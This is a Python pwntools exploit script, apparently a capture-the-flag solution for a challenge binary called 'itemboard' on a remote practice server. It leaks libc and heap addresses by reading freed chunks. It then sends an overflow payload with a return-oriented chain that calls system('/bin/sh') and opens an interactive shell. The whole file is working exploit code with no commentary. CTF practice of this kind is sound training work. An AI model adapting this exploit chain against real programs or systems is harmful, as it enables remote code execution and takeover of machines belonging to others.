from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('itemboard')
io = remote('node4.buuoj.cn', 25194)
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
libc = ELF('libc-2.23.so')
elf = ELF('itemboard')


def add(name, size, description):
    io.sendlineafter('choose:\n', '1')
    io.sendlineafter('Item name?\n', name)
    io.sendlineafter('Description\'s len?\n', str(size))
    io.sendlineafter('Description?\n', description)


def show(index):
    io.sendlineafter('choose:\n', '3')
    io.sendlineafter('Which item?\n', str(index))
    io.recvuntil('Description:')
    return io.recvline()[:-1]


def delete(index):
    io.sendlineafter('choose:\n', '4')
    io.sendlineafter('Which item?\n', str(index))


def leak():
    global libc_base, heap_base
    add('a', 0x88, 'a')
    add('b', 0x18, 'b')
    delete(0)
    libc_base = u64(show(0).ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x68
    log.success('libc_base: ' + hex(libc_base))
    delete(1)
    heap_base = u64(show(1).ljust(8, b'\x00')) - 0x4c0
    log.success('heap_base: ' + hex(heap_base))
    


def pwn():
    system = libc_base + libc.sym['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
    # pop_rdi_ret = libc_base + 0x0000000000021112
    # pop_rdx_rsi_ret = libc_base + 0x00000000001151c9
    pop_rdi_ret = libc_base + 0x0000000000021102
    pop_rdx_rsi_ret = libc_base + 0x00000000001150c9
    payload = cyclic(0x408) + p64(heap_base + 0x5b0) + cyclic(8) 
    payload += p64(pop_rdi_ret) + p64(bin_sh)
    payload += p64(pop_rdx_rsi_ret) + p64(0) + p64(0)
    payload += p64(system)
    # gdb.attach(io)
    add('c', len(payload) + 1, payload)
    # pause()
    io.interactive()
    

if __name__ == '__main__':
    leak()
    pwn()
